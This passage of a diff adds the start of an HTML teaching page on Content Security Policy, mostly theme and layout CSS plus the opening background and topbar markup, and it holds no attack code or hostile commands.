@@ -1,0 +1,1380 @@
+<!DOCTYPE html>
+<html lang="hi" data-theme="dark" data-lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CSP — Content Security Policy</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&family=Poppins:wght@700&display=swap" rel="stylesheet">
+<style>
+  :root[data-theme="dark"] {
+    --bg:#050810;
+    --panel:#0F1524;
+    --panel-2:#1A2338;
+    --border:#263049;
+    --text:#E7ECF5;
+    --text-muted:#8B96AB;
+    --danger:#FF6B5B;
+    --danger-bg:rgba(255,107,91,0.12);
+    --safe:#3ECF8E;
+    --safe-bg:rgba(62,207,142,0.12);
+    --accent:#FFC857;
+    --accent-bg:rgba(255,200,87,0.14);
+    --radius:12px;
+    --mono:'IBM Plex Mono',ui-monospace,monospace;
+    --sans:'IBM Plex Sans',system-ui,sans-serif;
+    --glow: rgba(77, 158, 255, 0.05);
+  }
+
+  :root[data-theme="light"] {
+    --bg:#F4F7FB;
+    --panel:#FFFFFF;
+    --panel-2:#E8EEF5;
+    --border:#D1D9E6;
+    --text:#0F172A;
+    --text-muted:#475569;
+    --danger:#E11D48;
+    --danger-bg:rgba(225,29,72,0.12);
+    --safe:#059669;
+    --safe-bg:rgba(5,150,105,0.12);
+    --accent:#D97706;
+    --accent-bg:rgba(217,119,6,0.14);
+    --radius:12px;
+    --mono:'IBM Plex Mono',ui-monospace,monospace;
+    --sans:'IBM Plex Sans',system-ui,sans-serif;
+    --glow: rgba(77, 158, 255, 0.05);
+  }
+
+  html[data-lang="hi"] .lang-en { display: none !important; }
+  html[data-lang="en"] .lang-hi { display: none !important; }
+
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    background:var(--bg);color:var(--text);font-family:var(--sans);
+    margin:0;padding:0;line-height:1.7;-webkit-font-smoothing:antialiased;
+    transition: background-color 0.3s, color 0.3s;
+    background-image: 
+      radial-gradient(circle at 15% 50%, var(--glow), transparent 25%),
+      radial-gradient(circle at 85% 30%, var(--glow), transparent 25%);
+  }
+  ::selection{background:var(--accent-bg);color:var(--accent);}
+  strong{color:var(--text);font-weight:600;}
+  
+  /* --- TYPOGRAPHY & CODE --- */
+  code{
+    font-family:var(--mono);background:var(--panel-2);border:1px solid var(--border);
+    padding:2px 6px;border-radius:6px;font-size:0.88em;color:var(--accent);
+    transition: all 0.2s;
+  }
+  code:hover { background: var(--accent-bg); border-color: var(--accent); }
+  
+  pre{
+    background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);
+    padding:40px 18px 18px 18px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;
+    line-height:1.6;color:var(--text);margin:18px 0; position: relative;
+    box-shadow: 0 10px 30px -10px rgba(0,0,0,0.2);
+  }
+  pre::before {
+    content: ''; position: absolute; top: 14px; left: 16px;
+    width: 10px; height: 10px; border-radius: 50%;
+    background: var(--danger); box-shadow: 16px 0 0 var(--accent), 32px 0 0 var(--safe);
+  }
+  pre code{background:none;border:none;padding:0;color:inherit; box-shadow: none;}
+  pre code:hover { background: none; border: none; }
+
+  /* --- TOPBAR --- */
+  .topbar{
+    position:sticky;top:0;z-index:50;background:rgba(15, 21, 36, 0.7);
+    backdrop-filter:blur(16px); -webkit-backdrop-filter:blur(16px);
+    border-bottom:1px solid var(--border);
+    padding:14px 20px;display:flex;align-items:center;justify-content:space-between;
+    gap:12px;flex-wrap:wrap; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  }
+  :root[data-theme="light"] .topbar { background:rgba(255, 255, 255, 0.8); }
+  
+  .brand{
+    font-family:var(--mono);font-weight:700;font-size:16px;
+    display:flex;align-items:center;gap:10px;cursor:default;
+  }
+  .brand-icon { font-size: 19px; display: inline-block; animation: shield-pulse 2.5s infinite ease-in-out; }
+  
+  /* FIX 2: TWO-COLOR THEME (YELLOW & GREEN) FOR TITLE */
+  .brand-text {
+    background: linear-gradient(90deg, var(--accent), var(--safe));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    transition: all 0.3s ease;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .brand:hover .brand-text { filter: drop-shadow(0 0 10px rgba(255, 200, 87, 0.5)); }
+  @keyframes shield-pulse { 0%, 100% { transform: scale(1); filter: drop-shadow(0 0 3px var(--safe)); } 50% { transform: scale(1.15); filter: drop-shadow(0 0 10px var(--safe)); } }
+
+  .controls-wrapper { display: flex; align-items: center; gap: 15px; flex-wrap: wrap; }
+  .progress-dots{display:flex;gap:8px;align-items:center;}
+  .progress-dot{
+    width:11px;height:11px;border-radius:50%;background:var(--panel-2);
+    border:1.5px solid var(--border);cursor:pointer;padding:0;transition:all .2s ease;
+  }
+  .progress-dot:hover{transform:scale(1.3); background: var(--accent); border-color: var(--accent);}
+  .progress-dot.done{background:var(--safe);border-color:var(--safe); box-shadow: 0 0 8px var(--safe-bg);}
+  .progress-dot:focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
+
+  .theme-toggle {
+    background: var(--panel); border: 1px solid var(--border); color: var(--text);
+    padding: 6px 14px; border-radius: 20px; cursor: pointer; font-weight: 600;
+    font-family: var(--sans); font-size: 12px; transition: all 0.2s ease;
+  }
+  .theme-toggle:hover { border-color: var(--accent); background: var(--accent-bg); color: var(--accent); transform: translateY(-1px); }
+
+  .lang-switch-wrapper {
+    display: flex; align-items: center; gap: 6px; font-family: var(--sans);
+    font-size: 12px; font-weight: 600; color: var(--text); background: var(--panel);
+    padding: 6px 12px; border-radius: 20px; border: 1px solid var(--border);
+  }
+  .lang-active { color: var(--accent); text-shadow: 0 0 8px var(--accent-bg); } 
+  .lang-inactive { color: var(--text-muted); }
+  .switch { position: relative; display: inline-block; width: 32px; height: 18px; margin: 0 4px;}
+  .switch input { opacity: 0; width: 0; height: 0; }
+  .slider {
+    position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
+    background-color: var(--border); transition: .4s; border-radius: 20px;
+  }
+  .slider:before {
+    position: absolute; content: ""; height: 12px; width: 12px; left: 3px; bottom: 3px;
+    background-color: var(--text); transition: .4s; border-radius: 50%;
+  }
+  input:checked + .slider { background-color: var(--accent); }
+  input:checked + .slider:before { transform: translateX(14px); background-color: #fff; }
+
+  main{max-width:860px;margin:0 auto;padding:0 20px 20px; position: relative; z-index: 1;}
+
+  /* --- HERO AREA --- */
+  .hero{padding:50px 0 40px; position: relative; border-bottom: 1px solid var(--border); margin-bottom: 40px;}
+  .hero::after {
+    content: ''; position: absolute; top: -50px; left: 50%; transform: translateX(-50%);
+    width: 100vw; height: 100%; background: radial-gradient(ellipse at top, var(--safe-bg), transparent 60%);
+    z-index: -1; pointer-events: none; opacity: 0.5;
+  }
+  .hero-badge{
+    display:inline-flex;align-items:center;gap:8px;
+    font-family:var(--mono);font-size:12.5px;color:var(--safe);font-weight: 600;
+    border:1px solid var(--safe);background: var(--safe-bg); padding:6px 14px;border-radius:100px;margin-bottom:24px;
+    box-shadow: 0 4px 15px var(--safe-bg);
+  }
+  .hero-badge span.dot{width:6px;height:6px;border-radius:50%;background:var(--safe); animation: blink 1s infinite alternate;}
+  @keyframes blink{50%{opacity:0.3;}}
+  
+  .hero-title{
+    font-family:var(--mono);font-weight:700;font-size:clamp(24px,4.5vw,42px);
+    line-height:1.3;margin:0 0 16px;color:var(--text);letter-spacing:-0.01em;
+  }
+  .hero-title .hl{color:var(--accent);}
+  .hero-sub{font-size:16px;color:var(--text-muted);max-width:680px;margin-bottom:34px; line-height: 1.6;}
+
+  /* --- STORY BLOCKS --- */
+  .story {
+    background: linear-gradient(135deg, var(--panel) 0%, transparent 100%);
+    border: 1px solid var(--border); border-left: 4px solid var(--danger);
+    border-radius: 12px; padding: 24px; margin-bottom: 24px;
+    box-shadow: 0 8px 25px rgba(0,0,0,0.05); position: relative; overflow: hidden;
+  }
+  .story.story-solution { border-left-color: var(--safe); }
+  .story::after {
+    content:''; position:absolute; right:-20px; bottom:-20px; width:100px; height:100px;
+    background: radial-gradient(circle, var(--danger-bg) 0%, transparent 70%); pointer-events: none;
+  }
+  .story.story-solution::after { background: radial-gradient(circle, var(--safe-bg) 0%, transparent 70%); }
+  
+  .story .lbl {
+    font-family: var(--mono); font-weight: 700; color: var(--danger);
+    margin-bottom: 12px; display: block; font-size: 13px; text-transform: uppercase; letter-spacing: 1px;
+  }
+  .story.story-solution .lbl { color: var(--safe); }
+  .story p{margin:0 0 14px;font-size:15px;color:var(--text); text-align: justify; line-height: 1.7;}
+  .story p:last-child{margin-bottom:0;}
+  .story code.inline-code{ background:rgba(255,107,91,0.1); border:1px solid rgba(255,107,91,0.3); color:var(--danger); }
+
+  /* ---------- Section headers ---------- */
+  .section { padding: 40px 0; border-bottom: 1px solid var(--border); }
+  .section:last-of-type { border-bottom: none; }
+  .sec-eyebrow{font-family:var(--mono);font-size:12px;letter-spacing:.15em;color:var(--accent);text-transform:uppercase;margin:0 0 10px; display: flex; align-items: center; gap: 8px;}
+  .sec-eyebrow::after { content: ''; height: 1px; width: 40px; background: var(--accent); opacity: 0.5; }
+  .section-title{
+    font-family:var(--mono);font-size:clamp(20px,4vw,28px);margin:0 0 14px;
+    background: linear-gradient(90deg, var(--text), var(--text-muted));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .section-desc{font-size:15px;color:var(--text-muted);margin:0 0 24px;max-width:680px; line-height: 1.6; text-align: justify;}
+
+  /* --- BASICS INTRO BLOCK --- */
+  .intro-block {
+    background: var(--panel); border: 1px solid var(--border); border-radius: 12px;
+    padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-top: 10px;
+  }
+  .intro-block p { margin-bottom: 14px; font-size: 15px; line-height: 1.7; text-align: justify; color: var(--text); }
+  .intro-block p:last-child { margin-bottom: 0; }
+  
+  /* --- SYNTAX ANNOTATIONS --- */
+  .code-label{ font-family:var(--mono);font-size:12px;color:var(--accent);font-weight: 600; text-transform:uppercase; letter-spacing:0.05em;margin-bottom:8px;display:block;}
+  .syntax-annot { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 10px 24px; margin: 20px 0; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+  .annot-row { display: grid; grid-template-columns: 200px 1fr; gap: 16px; padding: 16px 0; border-bottom: 1px solid var(--border); align-items: start; }
+  .annot-row:last-child { border-bottom: none; }
+  .annot-row code { color: var(--accent); font-size: 14px; background: transparent; border: none; padding:0; }
+  .annot-row span.d { color: var(--text-muted); font-size: 14.5px; line-height: 1.6;}
+  
+  .meta-note{
+    display:flex;gap:16px;background:linear-gradient(145deg, var(--panel-2), var(--panel)); border:1px solid var(--border);
+    border-radius:12px;padding:20px;margin-top:24px; box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+  }
+  .meta-note .icon{font-size:24px;flex-shrink:0;}
+  
+  .warn-box{
+    background:linear-gradient(90deg, var(--danger-bg), transparent); border:1px solid rgba(255,107,91,0.2); border-left: 4px solid var(--danger);
+    border-radius:10px; padding:16px 20px; margin:20px 0; font-size:14.5px; color: var(--text);
+  }
+
+  /* --- CARD GRIDS (Directives & Values) --- */
+  .group-block { margin-bottom: 40px; }
+  .group-head { margin-bottom: 20px; }
+  .group-title { font-family: var(--mono); font-size: 20px; font-weight: 700; color: var(--text); display: flex; align-items: center; gap: 12px; }
+  .count { font-size: 13px; background: var(--panel-2); padding: 4px 10px; border-radius: 20px; color: var(--accent); }
+  .group-desc { font-size: 14.5px; color: var(--text-muted); margin-top: 8px; line-height: 1.6; }
+
+  .card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 16px; }
+  .card {
+    background: linear-gradient(145deg, var(--panel), var(--bg)); border: 1px solid var(--border);
+    border-radius: 12px; padding: 22px; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    position: relative;
+  }
+  .card:hover { transform: translateY(-4px); box-shadow: 0 10px 25px rgba(0,0,0,0.15); border-color: var(--accent); }
+  .card-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px; }
+  .card-title { font-family: var(--mono); font-size: 15.5px; font-weight: 700; color: var(--text); transition: color 0.3s; }
+  .card:hover .card-title { color: var(--accent); }
+  .card-tag { font-size: 10.5px; font-weight: 700; padding: 4px 10px; border-radius: 20px; font-family: var(--mono); }
+  
+  .tag-imp { background: var(--accent-bg); color: var(--accent); border: 1px solid rgba(255,200,87,0.2); }
+  .tag-danger { background: var(--danger-bg); color: var(--danger); border: 1px solid rgba(255,107,91,0.2); }
+  .tag-safe { background: var(--safe-bg); color: var(--safe); border: 1px solid rgba(62,207,142,0.2); }
+  .tag-neutral { background: var(--panel-2); color: var(--text-muted); border: 1px solid var(--border); }
+  
+  .card-def { font-size: 14px; color: var(--text-muted); margin-bottom: 16px; line-height: 1.6; text-align: justify;}
+  .card pre.code-block { margin: 0; padding: 12px; background: rgba(0,0,0,0.2); border-color: var(--border); }
+  .card pre.code-block::before { display: none; } /* remove dot for small blocks */
+
+  .value-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 16px; }
+  .value-card {
+    background: linear-gradient(145deg, var(--panel), var(--bg)); border: 1px solid var(--border);
+    border-radius: 12px; padding: 22px; transition: all 0.3s;
+  }
+  .value-card:hover { transform: translateY(-4px); box-shadow: 0 10px 25px rgba(0,0,0,0.15); border-color: var(--accent); }
+  .value-head { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; }
+  .value-name { font-family: var(--mono); color: var(--accent); font-size: 15.5px; font-weight: 700; }
+  .value-badge { font-size: 10px; padding: 3px 8px; border-radius: 100px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.04em; }
+  .value-badge.danger { background: var(--danger-bg); color: var(--danger); border: 1px solid rgba(241,107,92,0.15); }
+  .value-def { font-size: 14px; color: var(--text-muted); margin-bottom: 14px; line-height: 1.6; text-align: justify;}
+  .value-card pre.code-block { margin: 0; padding: 12px; background: rgba(0,0,0,0.2); }
+  .value-card pre.code-block::before { display: none; }
+
+  /* --- SIMULATOR --- */
+  .sim-wrap { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; box-shadow: 0 15px 40px rgba(0,0,0,0.2); margin-top: 20px;}
+  .sim-controls { padding: 24px; background: #0a0c10; border-bottom: 1px solid #1f242d; }
+  .sim-config-label{font-size:13.5px;color:var(--text-muted);margin-bottom:12px;font-weight:600; font-family: var(--mono);}
+  .config-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 12px; margin-bottom: 20px; }
+  .config-pill { background: transparent; border: 1px solid #1f242d; border-radius: 8px; padding: 12px 16px; text-align: left; cursor: pointer; transition: all 0.2s; color: #64748b; font-family: var(--mono); }
+  .config-pill:hover { color: #fff; border-color: #4d9eff; }
+  .config-pill.selected { background: rgba(77,158,255,0.1); border-color: #4d9eff; color: #4d9eff; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+  .pill-label { display: block; font-family: var(--sans); font-size: 11.5px; font-weight: 700; text-transform: uppercase; margin-bottom: 4px; letter-spacing: 0.5px; color: inherit; opacity: 0.7; }
+  .test-btn { background: rgba(57, 255, 122, 0.1); color: #39ff7a; border: 1px solid #39ff7a; padding: 12px 24px; border-radius: 8px; font-family: var(--mono); font-size: 13px; font-weight: 700; cursor: pointer; transition: all 0.2s; text-transform: uppercase; letter-spacing: 1px; }
+  .test-btn:hover { background: #39ff7a; color: #000; transform: translateY(-2px); box-shadow: 0 4px 15px rgba(57, 255, 122, 0.3); }
+  
+  .browser-mock { margin: 24px; border: 1px solid #1f242d; border-radius: 10px; overflow: hidden; background: #050505; }
+  .browser-bar { background: #11141a; padding: 10px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #1f242d; }
+  .browser-dot { width: 10px; height: 10px; border-radius: 50%; background: #3A4460; }
+  .browser-dot:nth-child(1) { background: #FF5F56; }
+  .browser-dot:nth-child(2) { background: #FFBD2E; }
+  .browser-dot:nth-child(3) { background: #27C93F; }
+  .url-bar { flex: 1; background: #000; padding: 6px 12px; border-radius: 6px; font-family: var(--mono); font-size: 12px; color: #8fa0b3; border: 1px solid #1f242d; }
+  
+  .console-panel { padding: 20px; font-family: var(--mono); min-height: 150px;}
+  .console-placeholder{color:var(--text-muted);font-family:var(--font-mono);font-size:13px;text-align:center;padding:30px 0;}
+  .console-line { padding: 14px; margin-bottom: 10px; border-radius: 8px; background: rgba(255,255,255,0.03); border-left: 3px solid transparent; display: grid; grid-template-columns: 24px 1fr; gap: 12px; }
+  .console-line.is-blocked { border-left-color: var(--safe); background: rgba(62,207,142,0.05); }
+  .console-line.is-executed { border-left-color: var(--danger); background: rgba(255,107,91,0.05); }
+  .console-icon { font-size: 16px; }
+  .console-payload-name { font-size: 13.5px; font-weight: 700; color: #fff; margin-bottom: 4px; }
+  .console-msg { font-size: 12px; color: var(--text-muted); margin-bottom: 8px; line-height: 1.5; }
+  .console-reason { font-family: var(--sans); font-size: 13.5px; color: #e2e8f0; line-height: 1.5; text-align: justify; }
+  
+  .sim-verdict { margin-top: 20px; padding: 16px 20px; border-radius: 8px; font-size: 14.5px; font-weight: 600; text-align: center; }
+  .sim-verdict.safe { background: rgba(62,216,160,0.1); color: var(--safe); border: 1px solid rgba(62,216,160,0.3); }
+  .sim-verdict.compromised { background: rgba(241,107,92,0.1); color: var(--danger); border: 1px solid rgba(241,107,92,0.3); }
+  .sim-verdict.partial { background: rgba(245,185,66,0.1); color: #F5B942; border: 1px solid rgba(245,185,66,0.3); }
+
+  /* --- MISCONFIGURATIONS --- */
+  .misconfig-list { display: flex; flex-direction: column; gap: 16px; }
+  .misconfig-item {
+    background: var(--panel); border: 1px solid var(--border); border-left: 4px solid var(--danger);
+    border-radius: 10px; padding: 20px 24px; display: grid; grid-template-columns: 32px 1fr; gap: 16px;
+    transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+  }
+  .misconfig-item:hover { transform: translateX(4px); box-shadow: 0 8px 25px rgba(0,0,0,0.1); border-color: rgba(255,255,255,0.1); }
+  .misconfig-num { font-family: var(--mono); color: var(--danger); font-size: 16px; font-weight: 700; }
+  .misconfig-title { font-size: 15.5px; font-weight: 700; color: var(--text); margin-bottom: 6px; }
+  .misconfig-desc { font-size: 14.5px; color: var(--text-muted); line-height: 1.6; text-align: justify; }
+
+  /* --- CHECKLIST --- */
+  .checklist-progress { background: var(--panel); border: 1px solid var(--border); padding: 16px 20px; border-radius: 12px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
+  .progress-text { font-family: var(--mono); font-size: 13.5px; color: var(--accent); font-weight: 600; }
+  .progress-bar-track { flex: 1; height: 6px; background: var(--panel-2); border-radius: 10px; margin: 0 20px; overflow: hidden; }
+  .progress-bar-fill { height: 100%; background: var(--safe); width: 0%; transition: width 0.3s ease; }
+  
+  .checklist { display: flex; flex-direction: column; gap: 8px; }
+  .checklist-item {
+    display: flex; align-items: flex-start; gap: 16px; padding: 16px 20px; background: var(--bg);
+    border: 1px solid transparent; border-radius: 10px; cursor: pointer; transition: all 0.2s ease;
+  }
+  .checklist-item:hover { background: var(--panel); border-color: var(--border); transform: translateX(4px); }
+  .checklist-box { width: 22px; height: 22px; border: 2px solid var(--text-muted); border-radius: 6px; display: flex; align-items: center; justify-content: center; transition: all 0.2s; margin-top: 2px; }
+  .checklist-item.checked .checklist-box { background: var(--safe); border-color: var(--safe); transform: rotate(360deg); }
+  .checklist-box svg { width: 14px; height: 14px; opacity: 0; stroke: #000; transition: opacity 0.2s; }
+  .checklist-item.checked .checklist-box svg { opacity: 1; }
+  .checklist-text { font-size: 14.5px; color: var(--text); transition: all 0.2s; line-height: 1.6; text-align: justify;}
+  .checklist-item.checked .checklist-text { color: var(--text-muted); text-decoration: line-through; opacity: 0.6; }
+  
+  .tools-note { margin-top: 24px; padding: 18px 22px; background: linear-gradient(90deg, var(--panel), transparent); border-left: 4px solid var(--accent); border-radius: 8px; font-size: 14px; color: var(--text-muted); line-height: 1.6;}
+  .tools-note strong { color: var(--text); }
+
+  /* --- SUMMARY TABLE --- */
+  .table-wrap { overflow-x: auto; border: 1px solid var(--border); border-radius: 12px; background: var(--panel); box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+  table.summary-table { width: 100%; border-collapse: collapse; min-width: 600px; }
+  table.summary-table th { background: var(--panel-2); color: var(--text-muted); padding: 14px 20px; text-align: left; font-family: var(--mono); font-size: 12.5px; text-transform: uppercase; border-bottom: 1px solid var(--border); }
+  table.summary-table td { padding: 14px 20px; border-bottom: 1px solid var(--border); font-size: 14px; color: var(--text); }
+  table.summary-table tr:hover td { background: rgba(255,255,255,0.02); }
+  table.summary-table td:first-child { color: var(--accent); font-family: var(--mono); font-weight: 600; }
+
+  /* --- GLOSSARY --- */
+  .glossary-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 16px; }
+  .glossary-item { background: linear-gradient(145deg, var(--panel), var(--bg)); border: 1px solid var(--border); border-left: 4px solid var(--accent); border-radius: 10px; padding: 20px; transition: transform 0.2s; }
+  .glossary-item:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0,0,0,0.1); border-color: rgba(255,255,255,0.1); }
+  .glossary-term { font-family: var(--mono); color: var(--accent); font-size: 15px; font-weight: 700; margin-bottom: 8px; }
+  .glossary-def { font-size: 14px; color: var(--text-muted); line-height: 1.6; text-align: justify; }
+
+    /* ── Designed and Developed by Footer ── */
+  .modern-footer { padding: 40px 18px 30px; text-align: center; position: relative; z-index: 1; }
+  .footer-badge {
+    display: inline-flex; align-items: center; gap: 10px;
+    background: linear-gradient(145deg, var(--panel-2), var(--panel));
+    padding: 12px 28px; border-radius: 30px; font-family: var(--mono); font-size: 13.5px;
+    color: var(--text-muted); border: 1px solid var(--border);
+    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.25); cursor: default;
+  }
+  .footer-badge:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 30px rgba(239, 68, 68, 0.25);
+    border-color: var(--danger);
+    color: var(--text);
+  }
+  .dev-name {
+    font-family: 'Poppins', sans-serif;
+    font-weight: 700;
+    font-size: 1.05rem;
+    background: linear-gradient(90deg, #3B82F6, #A855F7, #F43F5E, #F59E0B, #3B82F6);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    background-size: 200% auto;
+    animation: gradient-flow 4s linear infinite;
+  }
+  @keyframes gradient-flow {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
+
+  /* Utilities */
+  .reveal{opacity:0;transform:translateY(14px);transition:opacity .5s ease, transform .5s ease;}
+  .reveal.in{opacity:1;transform:translateY(0);}
+
+  @media (max-width:640px){
+    .annot-row { grid-template-columns: 1fr; gap: 8px; padding: 12px 0; }
+    .hero { padding: 40px 0 20px; }
+    main { padding: 0 14px 20px; }
+  }
+  @media (prefers-reduced-motion:reduce){
+    html{scroll-behavior:auto;}
+    *{transition-duration:0.01ms !important; animation: none !important;}
+  }
+  /* ---------- DYNAMIC CYBER BACKGROUND ---------- */
+  .cyber-bg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    pointer-events: none;
+    z-index: 0;
+    overflow: hidden;
+  }
+
+  /* Matrix Dot Grid Overlay with continuous slow drift */
+  .cyber-grid {
+    position: absolute;
+    inset: -120px;
+    background-image: 
+      radial-gradient(rgba(255, 255, 255, 0.12) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    background-size: 32px 32px, 96px 96px, 96px 96px;
+    -webkit-mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
+    mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
+    opacity: 0.85;
+    animation: gridDrift 60s linear infinite;
+  }
+  :root[data-theme="light"] .cyber-grid {
+    background-image: 
+      radial-gradient(rgba(15, 23, 42, 0.08) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    opacity: 0.6;
+  }
+
+  @keyframes gridDrift {
+    0% { transform: translate(0, 0); }
+    100% { transform: translate(96px, 96px); }
+  }
+
+  /* Ambient Glowing Floating Orbs */
+  .cyber-orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(100px);
+    opacity: 0.35;
+    will-change: transform;
+  }
+  :root[data-theme="light"] .cyber-orb {
+    opacity: 0.18;
+    filter: blur(110px);
+  }
+
+  .orb-1 {
+    width: 650px;
+    height: 650px;
+    background: radial-gradient(circle, #6366f1 0%, rgba(99,102,241,0) 70%);
+    top: -120px;
+    left: -100px;
+    animation: floatOrb1 16s ease-in-out infinite alternate;
+  }
+
+  .orb-2 {
+    width: 700px;
+    height: 700px;
+    background: radial-gradient(circle, #a855f7 0%, rgba(168,85,247,0) 70%);
+    top: 15%;
+    right: -150px;
+    animation: floatOrb2 20s ease-in-out infinite alternate;
+  }
+
+  .orb-3 {
+    width: 560px;
+    height: 560px;
+    background: radial-gradient(circle, #06b6d4 0%, rgba(6,182,212,0) 70%);
+    bottom: -80px;
+    left: 15%;
+    animation: floatOrb3 18s ease-in-out infinite alternate;
+  }
+
+  .orb-4 {
+    width: 500px;
+    height: 500px;
+    background: radial-gradient(circle, #f43f5e 0%, rgba(244,63,94,0) 70%);
+    bottom: 18%;
+    right: 12%;
+    animation: floatOrb4 22s ease-in-out infinite alternate;
+  }
+
+  /* Keyframe Animations for Smooth Floating */
+  @keyframes floatOrb1 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(120px, 90px) scale(1.15); }
+    100% { transform: translate(-60px, 140px) scale(0.92); }
+  }
+
+  @keyframes floatOrb2 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(-140px, 110px) scale(1.18); }
+    100% { transform: translate(-80px, -70px) scale(0.9); }
+  }
+
+  @keyframes floatOrb3 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(90px, -100px) scale(1.14); }
+    100% { transform: translate(-100px, -50px) scale(1.05); }
+  }
+
+  @keyframes floatOrb4 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(-110px, -80px) scale(1.2); }
+    100% { transform: translate(90px, 70px) scale(0.9); }
+  }
+
+  /* Floating Cyber Data Particles */
+  .cyber-particle {
+    position: absolute;
+    border-radius: 50%;
+    background: #fff;
+    box-shadow: 0 0 8px currentColor;
+    opacity: 0;
+    animation: floatParticle 14s infinite ease-in-out;
+  }
+
+  .p-1 { width: 3px; height: 3px; left: 12%; bottom: -20px; color: var(--brand-1); animation-delay: 0s; animation-duration: 15s; }
+  .p-2 { width: 4px; height: 4px; left: 28%; bottom: -20px; color: var(--brand-2); animation-delay: 3s; animation-duration: 18s; }
+  .p-3 { width: 3px; height: 3px; left: 48%; bottom: -20px; color: var(--safe); animation-delay: 6s; animation-duration: 14s; }
+  .p-4 { width: 4px; height: 4px; left: 68%; bottom: -20px; color: var(--danger); animation-delay: 2s; animation-duration: 20s; }
+  .p-5 { width: 3px; height: 3px; left: 84%; bottom: -20px; color: var(--accent); animation-delay: 7s; animation-duration: 16s; }
+  .p-6 { width: 4px; height: 4px; left: 94%; bottom: -20px; color: #38bdf8; animation-delay: 4s; animation-duration: 19s; }
+  .p-7 { width: 3px; height: 3px; left: 38%; bottom: -20px; color: var(--safe); animation-delay: 9s; animation-duration: 17s; }
+  .p-8 { width: 4px; height: 4px; left: 58%; bottom: -20px; color: var(--brand-2); animation-delay: 11s; animation-duration: 21s; }
+
+  @keyframes floatParticle {
+    0% { transform: translateY(0) translateX(0) scale(0.5); opacity: 0; }
+    15% { opacity: 0.8; }
+    85% { opacity: 0.8; }
+    100% { transform: translateY(-105vh) translateX(50px) scale(1.2); opacity: 0; }
+  }
+
+  /* Scanline sweep effect */
+  .cyber-scanline {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(180deg, transparent 0%, rgba(99, 102, 241, 0.035) 50%, transparent 100%);
+    background-size: 100% 200%;
+    animation: scanSweep 12s linear infinite;
+  }
+
+  @keyframes scanSweep {
+    0% { background-position: 0% 0%; }
+    100% { background-position: 0% 200%; }
+  }
+
+</style>
+</head>
+<body data-lang="hi">
+
+<!-- ================= DYNAMIC CYBER BACKGROUND ================= -->
+<div class="cyber-bg" aria-hidden="true">
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+  <div class="cyber-grid"></div>
+  <div class="cyber-scanline"></div>
+  <div class="cyber-particle p-1"></div>
+  <div class="cyber-particle p-2"></div>
+  <div class="cyber-particle p-3"></div>
+  <div class="cyber-particle p-4"></div>
+  <div class="cyber-particle p-5"></div>
+  <div class="cyber-particle p-6"></div>
+  <div class="cyber-particle p-7"></div>
+  <div class="cyber-particle p-8"></div>
+</div>
+
+<div class="topbar">
+  <div class="brand">
+    <span class="brand-icon">🛡️</span>
+    <span class="brand-text">CSP: Content Security Policy</span>
+  </div>
